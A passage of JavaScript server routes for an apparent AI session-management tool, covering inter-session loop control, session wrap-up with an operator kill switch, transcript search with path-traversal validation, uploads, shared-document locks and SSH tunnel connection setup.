// (delivered live) or `queued` (recipient offline) — never a blanket "sent";
// validation and Bridge failures surface as errors, not false successes.
route('POST', '/api/sessions/:project/medusa/send', async (_req, res, params, body) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  if (!active) {
    return errorResponse(res, 409, 'No active session to send from', 'NO_SESSION');
  }
  try {
    const result = await medusa.sendMessage({
      sessionId: active.id,
      to: body && body.to,
      message: body && body.message
    });
    jsonResponse(res, 200, result);
  } catch (err) {
    errorResponse(res, err.httpStatus || 502, err.message, err.code || 'MEDUSA_SEND_FAILED');
  }
});

// POST /api/sessions/:project/medusa/loop — open a Medusa loop from this session
// to a target workspace (MED-2K9P v2 T3, the setup modal's launch). Body
// `{ target, task, doneCriteria, mode, guards }`. Requires an active session
// (409). Returns `{ loop }` — the created loop object; the Bridge itself
// delivers the loopInvite to the target (durably queued, pushed live when the
// target is online — Medusa#47 fixed upstream, so TC's out-of-band task notice
// was dropped, TC#552). Validation and Bridge failures surface as errors,
// never a false "launched".
route('POST', '/api/sessions/:project/medusa/loop', async (_req, res, params, body) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  if (!active) {
    return errorResponse(res, 409, 'No active session to open a loop from', 'NO_SESSION');
  }
  try {
    const result = await medusa.openLoop({
      sessionId: active.id,
      target: body && body.target,
      task: body && body.task,
      doneCriteria: body && body.doneCriteria,
      mode: body && body.mode,
      guards: body && body.guards
    });
    jsonResponse(res, 200, result);
  } catch (err) {
    errorResponse(res, err.httpStatus || 502, err.message, err.code || 'MEDUSA_LOOP_FAILED');
  }
});

// POST /api/sessions/:project/medusa/loops/:loopId/force-done — the human
// kill-switch on a loop this session initiated (MED-2K9P v2 T4). Rides the
// Bridge's initiator-only close with a structured
// `closeSignal.reason: 'force-done'` (the Bridge reserves `halted` for its own
// runaway guards — no external halt transition exists). Bridge rejections pass
// through with their real status: 403 = not the initiator (the control
// invariant), 400 = already complete or guard-halted ("a halted loop cannot be
// closed"), 404 = the Bridge no longer knows the loop.
route('POST', '/api/sessions/:project/medusa/loops/:loopId/force-done', async (_req, res, params) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  if (!active) {
    return errorResponse(res, 409, 'No active session to end a loop from', 'NO_SESSION');
  }
  try {
    const result = await medusa.forceDoneLoop({ sessionId: active.id, loopId: params.loopId });
    jsonResponse(res, 200, result);
  } catch (err) {
    errorResponse(res, err.httpStatus || 502, err.message, err.code || 'MEDUSA_FORCE_DONE_FAILED');
  }
});

// POST /api/sessions/:project/medusa/loops/:loopId/continue — send an initiator
// FEEDBACK round to continue a supervised loop this session initiated (TC#561 —
// the FEEDBACK half of the design §1 control spine). Body `{ message }`. Rides
// the Bridge's `POST /loops/:id/message`; valid only once the target has
// responded (`state === 'responded'`) — a wrong-state click surfaces the
// Bridge's 400 verbatim, never a false "sent".
route('POST', '/api/sessions/:project/medusa/loops/:loopId/continue', async (_req, res, params, body) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  if (!active) {
    return errorResponse(res, 409, 'No active session to continue a loop from', 'NO_SESSION');
  }
  try {
    const result = await medusa.continueLoop({ sessionId: active.id, loopId: params.loopId, message: body && body.message });
    jsonResponse(res, 200, result);
  } catch (err) {
    errorResponse(res, err.httpStatus || 502, err.message, err.code || 'MEDUSA_CONTINUE_FAILED');
  }
});

// POST /api/sessions/:project/medusa/loops/:loopId/closeout — the SATISFIED
// closeout of a loop this session initiated (TC#561 — the CLOSEOUT half of the
// control spine). Distinct from force-done (the kill-switch): rides the Bridge
// close with `closeSignal.reason: 'satisfied'` so the outcome is labeled
// "ended — marked done", not "ended by force-done". Same initiator-only (403)
// / already-closed (400) / unknown (404) passthrough.
route('POST', '/api/sessions/:project/medusa/loops/:loopId/closeout', async (_req, res, params) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  if (!active) {
    return errorResponse(res, 409, 'No active session to close a loop from', 'NO_SESSION');
  }
  try {
    const result = await medusa.closeoutLoop({ sessionId: active.id, loopId: params.loopId });
    jsonResponse(res, 200, result);
  } catch (err) {
    errorResponse(res, err.httpStatus || 502, err.message, err.code || 'MEDUSA_CLOSEOUT_FAILED');
  }
});

// POST /api/sessions/:project/wrap-sentinel/ack — Clear a pending typed-wrap
// request once the session view has opened the wrap drawer, so the poll won't
// reopen it (CC-7 Slice C). Idempotent: acking with nothing pending is a no-op.
route('POST', '/api/sessions/:project/wrap-sentinel/ack', (_req, res, params) => {
  const cleared = wrapSentinel.ackWrapRequest(params.project);
  jsonResponse(res, 200, { ok: true, project: params.project, cleared });
});

// POST /api/sessions/:project/command — Inject command
route('POST', '/api/sessions/:project/command', (_req, res, params, body) => {
  if (!body || !body.command) {
    return errorResponse(res, 400, 'command is required', 'BAD_REQUEST');
  }
  if (body.command.length > 4096) {
    return errorResponse(res, 400, 'Command exceeds maximum length of 4096 characters', 'BAD_REQUEST');
  }

  const result = sessions.injectCommand(params.project, body.command, {
    enter: body.enter !== false
  });

  if (!result.ok) {
    if (result.error.includes('not found') || result.error.includes('No active')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  jsonResponse(res, 200, {
    ok: true,
    project: params.project,
    command: body.command
  });
});

// POST /api/sessions/:project/wrap — Trigger wrap skill
// Body: { password?, options? } — `options` is V2-only and carries per-wrap
// user choices the drawer collected on retry after a blocked step
// (`{skipTests, prHandling}`). Legacy V1 path ignores it.
route('POST', '/api/sessions/:project/wrap', async (_req, res, params, body) => {
  // Operator kill switch (incident 2026-07-16: wrap content steps re-fired
  // repeatedly into the session). Checked before anything else — while set,
  // no wrap can start regardless of caller. Re-enable via
  // PATCH /api/config {"wrapDisabled": false}.
  if (store.config.load().wrapDisabled === true) {
    return errorResponse(res, 503,
      'Session wrap is temporarily disabled by the operator (wrapDisabled). ' +
      'Re-enable via PATCH /api/config {"wrapDisabled": false}.',
      'WRAP_DISABLED');
  }
  const passwordCheck = projects.checkDeletePassword(body ? body.password : undefined);
  if (!passwordCheck.allowed) {
    return errorResponse(res, 403, passwordCheck.error, 'FORBIDDEN');
  }

  const options = body && typeof body.options === 'object' && body.options !== null ? body.options : undefined;
  const result = await sessions.triggerWrap(params.project, options);
  // #583 — server-side single-flight: a wrap pipeline is already running
  // for this project. 409 (not 500) so the frontend can switch to watching
  // the running run via GET /wrap/status instead of re-triggering it.
  if (!result.ok && result.code === 'WRAP_IN_PROGRESS') {
    return errorResponse(res, 409, result.error, 'WRAP_IN_PROGRESS');
  }
  // V2 may return ok:false from the pipeline (a blocked step). That's not a
  // server error — it's an expected pipeline outcome the drawer renders.
  // Surface it with HTTP 200 + `pipelineResult` so the frontend can paint
  // per-step status and collect retry inputs.
  if (!result.ok && !result.pipelineResult) {
    if (result.error && (result.error.includes('not found') || result.error.includes('No active'))) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error || 'Wrap failed', 'INTERNAL_ERROR');
  }

  jsonResponse(res, 200, _wrapResultPayload(params.project, result));
});

/**
 * Shape a `sessions.triggerWrap` result into the wrap POST's response
 * payload. Shared by `POST /wrap` and `GET /wrap/status` (#583) so the
 * reattach path renders the exact payload the original POST would have
 * delivered had its connection survived — the two can't drift.
 *
 * @param {string} projectName - Route-level project name
 * @param {object} result - `sessions.triggerWrap` return value
 * @returns {object} Response payload
 */
function _wrapResultPayload(projectName, result) {
  const payload = {
    ok: result.ok,
    sessionId: result.sessionId,
    project: projectName,
    status: result.ok ? 'wrapping' : 'blocked',
    wrapCommand: result.wrapCommand,
    wrapSteps: result.wrapSteps,
    captureFields: result.captureFields
  };
  if (result.pipelineResult) payload.pipelineResult = result.pipelineResult;
  if (!result.ok && result.error) payload.error = result.error;
  return payload;
}

// GET /api/sessions/:project/wrap/status — Wrap-run state (#583). Lets a
// client whose wrap POST connection died (proxy 502, page reload, phone
// lock) reattach: `running` + `currentStepId` while the pipeline runs,
// then the finished run's `result` in the same shape the POST would have
// returned. Registry is process-local: after a server restart this
// honestly reports no run (nothing survived the restart).
route('GET', '/api/sessions/:project/wrap/status', (_req, res, params) => {
  const status = sessions.getWrapRunStatus(params.project);
  jsonResponse(res, 200, {
    project: params.project,
    running: status.running,
    sessionId: status.sessionId,
    startedAt: status.startedAt,
    currentStepId: status.currentStepId,
    finishedAt: status.finishedAt,
    result: status.result ? _wrapResultPayload(params.project, status.result) : null
  });
});

// GET /api/sessions/:project/wrap/pr-status — Live wrap-PR outcome (#638). The
// wrap's commit step arms auto-merge and reports "armed", but the release only
// lands when GitHub merges the PR; this read-only probe lets the drawer report
// merged / pending / blocked / unknown after the pipeline returns, so a blocked
// release (a red required check, the #636 case) never renders as success. The
// `url` query param is validated against a github.com PR URL / number shape in
// `lib/wrap-pr-status.js` before it can reach `gh`.
route('GET', '/api/sessions/:project/wrap/pr-status', async (req, res, params) => {
  const query = parseQuery(reqUrl(req).search);
  const prRef = query.url || query.pr || '';
  if (!prRef) {
    return errorResponse(res, 400, 'Missing required query param: url (the wrap PR URL or number)', 'BAD_REQUEST');
  }
  const status = await sessions.getWrapPrStatus(params.project, prRef);
  jsonResponse(res, 200, { project: params.project, ...status });
});

// POST /api/sessions/:project/wrap/complete — Manual wrap completion
route('POST', '/api/sessions/:project/wrap/complete', (_req, res, params, body) => {
  const result = sessions.completeWrap(params.project, body ? body.summary : undefined);
  if (result.error) {
    if (result.error.includes('not found') || result.error.includes('No active')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  jsonResponse(res, 200, {
    ok: true,
    session: result.session
  });
});

// GET /api/sessions/:project/peek — Peek at terminal output
route('GET', '/api/sessions/:project/peek', (req, res, params) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  const full = query.full === 'true';
  const lines = query.lines ? parseInt(query.lines, 10) : 5;

  const result = sessions.peek(params.project, { lines, full });
  if (result.error) {
    return errorResponse(res, 404, result.error, 'NOT_FOUND');
  }

  jsonResponse(res, 200, {
    lines: result.lines,
    project: params.project,
    tmuxSession: result.tmuxSession,
    alternateScreen: result.alternateScreen || false
  });
});

// GET /api/sessions/:project/history — Session history
route('GET', '/api/sessions/:project/history', (req, res, params) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);

  const result = sessions.getSessionHistory(params.project, {
    limit: query.limit ? parseInt(query.limit, 10) : 20,
    status: query.status || undefined
  });

  if (result.error) {
    return errorResponse(res, 404, result.error, 'NOT_FOUND');
  }

  jsonResponse(res, 200, {
    sessions: result.sessions,
    total: result.total
  });
});

// ── CC-5: operator-facing cross-session continuity search ──
// These read the per-project continuity store (changelog + wrap summaries +
// cold transcripts), distinct from /api/sessions/:project/history above, which
// reads the SQLite sessions table. The drawer (History) consumes these.

/**
 * Validate an untrusted continuity `:sid` route param. The `<sid>` store key is
 * an integer session id or a wrap-summary filename stem; restrict it to the safe
 * charset BEFORE it reaches `path.join` in the store helpers. `matchRoute`
 * decodeURIComponent's after the `[^/]+` match, so a percent-encoded `..%2F..`
 * would otherwise traverse out of the project's store root.
 * @param {string} sid - Decoded route parameter
 * @returns {boolean} True when safe to use as a store key
 */
function _isValidSid(sid) {
  return typeof sid === 'string' && /^[A-Za-z0-9_-]+$/.test(sid);
}

/**
 * Strip the cold-tier meta envelope to the fields the UI needs, dropping the
 * absolute `source` path (a local `~/.claude` leak). Secret VALUES are never in
 * the meta to begin with (CC-4b records pattern types only).
 * @param {object|null} meta - Parsed `transcript.meta.json`, or null
 * @returns {object|null} UI-safe subset, or null when meta is absent
 */
function _publicTranscriptMeta(meta) {
  if (!meta) return null;
  return {
    harness: meta.harness || null,
    capturedAt: meta.capturedAt || null,
    bytes: meta.bytes || 0,
    lineCount: meta.lineCount || 0,
    secretsFlagged: !!meta.secretsFlagged,
    secretTypes: Array.isArray(meta.secretTypes) ? meta.secretTypes : [],
    scanSkipped: !!meta.scanSkipped
  };
}

// GET /api/continuity/:project/search — global search across this project's
// session history. `scope=summaries` (default) searches the warm changelog +
// wrap summaries; `scope=transcripts` greps every captured transcript directly
// (the "search my old transcripts" path). Both honor the same five filters.
route('GET', '/api/continuity/:project/search', async (req, res, params) => {
  const project = projects.getProjectRow(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const query = parseQuery(reqUrl(req).search);
  const opts = {
    dateFrom: query.dateFrom,
    dateTo: query.dateTo,
    type: query.type,
    tags: query.tags,
    refs: query.refs,
    file: query.file,
    section: query.section,
    limit: query.limit ? parseInt(query.limit, 10) : 0
  };
  const result = query.scope === 'transcripts'
    ? await continuity.searchProjectTranscripts(project.path, query.q || '', opts)
    : continuity.searchSessions(project.path, query.q || '', opts);
  jsonResponse(res, 200, result);
});

// GET /api/continuity/:project/sessions — list every session in the store
route('GET', '/api/continuity/:project/sessions', async (req, res, params) => {
  const project = projects.getProjectRow(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, { sessions: continuity.listSessions(project.path) });
});

// GET /api/continuity/:project/sessions/:sid — drill-down payload for one session
route('GET', '/api/continuity/:project/sessions/:sid', async (req, res, params) => {
  const project = projects.getProjectRow(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const sid = params.sid;
  if (!_isValidSid(sid)) {
    return errorResponse(res, 400, 'Invalid session id', 'BAD_REQUEST');
  }
  const session = continuity.listSessions(project.path).find((s) => s.sid === String(sid)) || null;
  jsonResponse(res, 200, {
    sid: String(sid),
    session,
    summary: continuity.readWrapSummary(project.path, sid),
    transcript: _publicTranscriptMeta(continuity.readTranscriptMeta(project.path, sid)),
    // listUploads tags each entry with `session` (the <sid> dir name), not `sid`.
    uploads: uploads.listUploads(project.path).filter((u) => String(u.session) === String(sid))
  });
});

// GET /api/continuity/:project/sessions/:sid/transcript/search — cold drill-down
route('GET', '/api/continuity/:project/sessions/:sid/transcript/search', async (req, res, params) => {
  const project = projects.getProjectRow(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  if (!_isValidSid(params.sid)) {
    return errorResponse(res, 400, 'Invalid session id', 'BAD_REQUEST');
  }
  const query = parseQuery(reqUrl(req).search);
  const result = await continuity.searchTranscript(project.path, params.sid, query.q || '', {
    cap: query.cap ? parseInt(query.cap, 10) : undefined
  });
  jsonResponse(res, 200, result);
});

// GET /api/activity — Activity log query
route('GET', '/api/activity', (req, res) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);

  const options = {};
  if (query.project) {
    const project = store.projects.getByName(query.project);
    if (project) options.projectId = project.id;
  }
  if (query.type) options.eventType = query.type;
  if (query.limit) options.limit = parseInt(query.limit, 10);
  if (query.since) options.since = query.since;

  const entries = store.activity.query(options);

  // Enrich with project names
  const projectCache = new Map();
  const enriched = entries.map((entry) => {
    let projectName = null;
    if (entry.projectId) {
      if (!projectCache.has(entry.projectId)) {
        const p = store.projects.get(entry.projectId);
        projectCache.set(entry.projectId, p ? p.name : null);
      }
      projectName = projectCache.get(entry.projectId);
    }
    return {
      id: entry.id,
      projectId: entry.projectId,
      projectName,
      sessionId: entry.sessionId,
      eventType: entry.eventType,
      detail: entry.detail,
      createdAt: entry.createdAt
    };
  });

  jsonResponse(res, 200, { entries: enriched });
});

// POST /api/upload — Upload a file to a project's .uploads/ directory
route('POST', '/api/upload', async (_req, res, _params, body) => {
  if (!body || !body.project || !body.filename || !body.data) {
    return errorResponse(res, 400, 'project, filename, and data are required', 'BAD_REQUEST');
  }

  const project = projects.getProjectRow(body.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${body.project}" not found`, 'NOT_FOUND');
  }

  if (!fs.existsSync(project.path)) {
    return errorResponse(res, 400, 'Project directory not found on disk', 'BAD_REQUEST');
  }

  try {
    // Route the upload into the active session's slot in the consolidated
    // store (CC-4); no active session → uploads.saveUpload falls back to the
    // legacy flat dir. `getActive` returns null when nothing is running.
    const active = store.sessions.getActive(project.id);
    const sid = active && active.id != null ? active.id : null;
    const result = uploads.saveUpload(project.path, body.filename, body.data, sid);
    jsonResponse(res, 201, result);
  } catch (err) {
    // #338 — any file type is accepted, so there is no "not allowed" rejection
    // path any more; a throw here is a genuine save failure.
    log.error('Upload failed', { error: err.message });
    return errorResponse(res, 500, err.message, 'INTERNAL_ERROR');
  }
}, { maxBodySize: 15 * 1024 * 1024 });

// GET /api/uploads — List uploads for a project
route('GET', '/api/uploads', async (req, res) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);

  if (!query.project) {
    return errorResponse(res, 400, 'project query parameter is required', 'BAD_REQUEST');
  }

  const project = projects.getProjectRow(query.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${query.project}" not found`, 'NOT_FOUND');
  }

  const list = uploads.listUploads(project.path);
  jsonResponse(res, 200, { uploads: list });
});

// GET /api/tmux/mouse/:session — effective value plus its source (#579):
// `explicit` = a session-level override exists (vs inherited from global).
route('GET', '/api/tmux/mouse/:session', (_req, res, params) => {
  try {
    const tmuxName = tmux.toSessionName(params.session);
    const state = tmux.getMouseState(tmuxName);
    jsonResponse(res, 200, {
      mouse: state.on,
      explicit: state.explicit,
      session: params.session
    });
  } catch (err) {
    return errorResponse(res, 404, err.message, 'NOT_FOUND');
  }
});

// ── Groups API ──

// GET /api/groups
route('GET', '/api/groups', (_req, res) => {
  const groups = store.projectGroups.list();
  // Enrich with member count and doc count
  const enriched = groups.map(g => {
    const members = store.projectGroups.listMembers(g.id);
    const docs = store.sharedDocs.getByGroup(g.id);
    return { ...g, memberCount: members.length, docCount: docs.length };
  });
  jsonResponse(res, 200, { groups: enriched });
});

// POST /api/groups
route('POST', '/api/groups', (_req, res, _params, body) => {
  if (!body || !body.name) {
    return errorResponse(res, 400, 'name is required', 'BAD_REQUEST');
  }
  try {
    const group = store.projectGroups.create(body);
    jsonResponse(res, 201, group);
  } catch (err) {
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    throw err;
  }
});

// GET /api/groups/:id
route('GET', '/api/groups/:id', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  const memberIds = store.projectGroups.listMembers(group.id);
  const members = memberIds.map(pid => {
    const proj = store.projects.get(pid);
    return proj ? { id: pid, name: proj.name, path: proj.path } : { id: pid, name: null, path: null };
  });
  const docs = store.sharedDocs.getByGroup(group.id);
  jsonResponse(res, 200, { ...group, memberCount: members.length, docCount: docs.length, members, docs });
});

// PUT /api/groups/:id
route('PUT', '/api/groups/:id', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  try {
    const group = store.projectGroups.update(params.id, body);
    jsonResponse(res, 200, group);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    throw err;
  }
});

// DELETE /api/groups/:id
route('DELETE', '/api/groups/:id', (_req, res, params) => {
  try {
    store.projectGroups.delete(params.id);
    jsonResponse(res, 200, { ok: true, id: params.id });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// POST /api/groups/:id/sync — Sync shared docs from group's sharedDir
route('POST', '/api/groups/:id/sync', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  if (!group.sharedDir) {
    return errorResponse(res, 400, 'Group has no sharedDir configured', 'BAD_REQUEST');
  }
  const result = store.sharedDocs.syncFromDirectory(params.id, group.sharedDir);
  jsonResponse(res, 200, { ok: true, ...result });
});

// ── Group Members API ──

// GET /api/groups/:id/members
route('GET', '/api/groups/:id/members', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  const memberIds = store.projectGroups.listMembers(params.id);
  // Enrich with project names
  const members = memberIds.map(pid => {
    const proj = store.projects.get(pid);
    return proj ? { id: pid, name: proj.name, path: proj.path } : { id: pid, name: null, path: null };
  });
  jsonResponse(res, 200, { members });
});

// POST /api/groups/:id/members
route('POST', '/api/groups/:id/members', (_req, res, params, body) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  if (!body || !body.projectId) {
    return errorResponse(res, 400, 'projectId is required', 'BAD_REQUEST');
  }
  const project = store.projects.get(body.projectId);
  if (!project) {
    return errorResponse(res, 404, `Project "${body.projectId}" not found`, 'NOT_FOUND');
  }
  store.projectGroups.addMember(params.id, body.projectId);
  jsonResponse(res, 200, { ok: true, groupId: params.id, projectId: body.projectId });
});

// DELETE /api/groups/:id/members/:projectId
route('DELETE', '/api/groups/:id/members/:projectId', (_req, res, params) => {
  const group = store.projectGroups.get(params.id);
  if (!group) {
    return errorResponse(res, 404, `Group "${params.id}" not found`, 'NOT_FOUND');
  }
  store.projectGroups.removeMember(params.id, parseInt(params.projectId, 10));
  jsonResponse(res, 200, { ok: true, groupId: params.id, projectId: parseInt(params.projectId, 10) });
});

// ── Shared Documents API ──

// GET /api/shared-docs
route('GET', '/api/shared-docs', (req, res) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  const options = {};
  if (query.groupId) options.groupId = query.groupId;
  const docs = store.sharedDocs.list(options);
  jsonResponse(res, 200, { docs });
});

// POST /api/shared-docs
route('POST', '/api/shared-docs', (_req, res, _params, body) => {
  if (!body || !body.groupId || !body.name || !body.filePath) {
    return errorResponse(res, 400, 'groupId, name, and filePath are required', 'BAD_REQUEST');
  }
  try {
    const doc = store.sharedDocs.create(body);
    jsonResponse(res, 201, doc);
  } catch (err) {
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// GET /api/shared-docs/:id
route('GET', '/api/shared-docs/:id', (_req, res, params) => {
  const doc = store.sharedDocs.get(params.id);
  if (!doc) {
    return errorResponse(res, 404, `Shared document "${params.id}" not found`, 'NOT_FOUND');
  }
  // Include lock status
  const lock = store.documentLocks.check(doc.id);
  jsonResponse(res, 200, { ...doc, lock: lock || null });
});

// PUT /api/shared-docs/:id
route('PUT', '/api/shared-docs/:id', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  try {
    const doc = store.sharedDocs.update(params.id, body);
    jsonResponse(res, 200, doc);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// DELETE /api/shared-docs/:id
route('DELETE', '/api/shared-docs/:id', (_req, res, params) => {
  try {
    store.sharedDocs.delete(params.id);
    jsonResponse(res, 200, { ok: true, id: params.id });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// ── Document Locks API ──

// POST /api/shared-docs/:id/lock
route('POST', '/api/shared-docs/:id/lock', (_req, res, params, body) => {
  if (!body || !body.sessionId || !body.projectName) {
    return errorResponse(res, 400, 'sessionId and projectName are required', 'BAD_REQUEST');
  }
  try {
    const lock = store.documentLocks.acquire(params.id, body.sessionId, body.projectName, body.ttlMinutes);
    jsonResponse(res, 200, lock);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'LOCK_CONFLICT') {
      return errorResponse(res, 409, err.message, 'LOCK_CONFLICT');
    }
    throw err;
  }
});

// GET /api/shared-docs/:id/lock
route('GET', '/api/shared-docs/:id/lock', (_req, res, params) => {
  const doc = store.sharedDocs.get(params.id);
  if (!doc) {
    return errorResponse(res, 404, `Shared document "${params.id}" not found`, 'NOT_FOUND');
  }
  const lock = store.documentLocks.check(params.id);
  jsonResponse(res, 200, { locked: !!lock, lock: lock || null });
});

// DELETE /api/shared-docs/:id/lock
route('DELETE', '/api/shared-docs/:id/lock', (_req, res, params) => {
  const doc = store.sharedDocs.get(params.id);
  if (!doc) {
    return errorResponse(res, 404, `Shared document "${params.id}" not found`, 'NOT_FOUND');
  }
  store.documentLocks.release(params.id);
  jsonResponse(res, 200, { ok: true, id: params.id });
});

// ── OpenClaw Connections API ──

// GET /api/openclaw/connections
route('GET', '/api/openclaw/connections', (_req, res) => {
  const connections = store.openclawConnections.list();
  jsonResponse(res, 200, { connections });
});

// POST /api/openclaw/connections
route('POST', '/api/openclaw/connections', (_req, res, _params, body) => {
  if (!body || !body.name || !body.host || !body.sshUser || !body.sshKeyPath) {
    return errorResponse(res, 400, 'name, host, sshUser, and sshKeyPath are required', 'BAD_REQUEST');
  }
  // Resolve the tunnel local_port. An explicit port is conflict-checked and
  // used verbatim; when omitted, PortHub auto-allocates the first free port so
  // a second connection can't silently collide on the legacy 18789 default (#352).
  if (body.localPort) {
    const portCheck = porthub.checkPort(body.localPort);
    if (!portCheck.available) {
      return errorResponse(res, 409, `Port ${body.localPort} is already in use by ${portCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
    }
  } else {
    try {
      body.localPort = porthub.nextFreePort({ range: [18789, 18999] });
    } catch (err) {
      return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
    }
  }
  // Resolve bridge_port. NULL-by-default is load-bearing: a non-null bridge_port
  // emits an extra `-L` SSH forward that breaks non-ClawBridge tunnels (#160), so
  // we only auto-allocate when the caller explicitly opts in with the 'auto'
  // sentinel. An explicit number is conflict-checked; anything else stays null.
  if (body.bridgePort === 'auto') {
    try {
      body.bridgePort = porthub.nextFreePort({ range: [3201, 3300] });
    } catch (err) {
      return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
    }
  } else if (body.bridgePort !== undefined && body.bridgePort !== null && body.bridgePort !== '') {
    const bridgeCheck = porthub.checkPort(body.bridgePort);
    if (!bridgeCheck.available) {
      return errorResponse(res, 409, `Bridge port ${body.bridgePort} is already in use by ${bridgeCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
    }
  }
  try {
    const connection = store.openclawConnections.create(body);
    // Lease-at-create: reserve the resolved port(s) under the connection's tunnel
    // identity so a subsequent add picks a different port even before the tunnel
    // comes up (closing the allocate→bind race). Released on DELETE.
    const leaseName = `oc-direct-${connection.id}`;
    porthub.registerPort(connection.localPort, leaseName, 'openclaw-tunnel', { permanent: true });
    if (connection.bridgePort) {
      porthub.registerPort(connection.bridgePort, leaseName, 'openclaw-bridge', { permanent: true });
    }
    jsonResponse(res, 201, connection);
  } catch (err) {
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// GET /api/openclaw/connections/:id
route('GET', '/api/openclaw/connections/:id', (_req, res, params) => {
  const connection = store.openclawConnections.get(params.id);
  if (!connection) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, connection);
});

// GET /api/openclaw/connections/:id/version — OpenClaw instance version (#296).
// Reads the pinned image tag from the instance's .env over SSH (cached). Needs
// the connection's `instanceDir` set; returns version:null + a reason otherwise.
route('GET', '/api/openclaw/connections/:id/version', (req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }
  const force = /[?&]force=(1|true)\b/.test(req.url || '');
  const result = openclawVersion.fetchVersion(conn, { force });
  jsonResponse(res, 200, { version: result.version, cached: !!result.cached, error: result.error });
});

// POST /api/openclaw/detect-instance-dir — auto-discover candidate instanceDir
// values over SSH (#306-followup). Stateless: takes the SSH-target fields in
// the body so it works from the Add form before the connection exists.
route('POST', '/api/openclaw/detect-instance-dir', (_req, res, _params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  const { host, sshUser, sshKeyPath } = body;
  const result = openclawDetect.detectInstanceDir({ host, sshUser, sshKeyPath });
  jsonResponse(res, 200, { dirs: result.dirs, error: result.error });
});

// PUT /api/openclaw/connections/:id
route('PUT', '/api/openclaw/connections/:id', (_req, res, params, body) => {
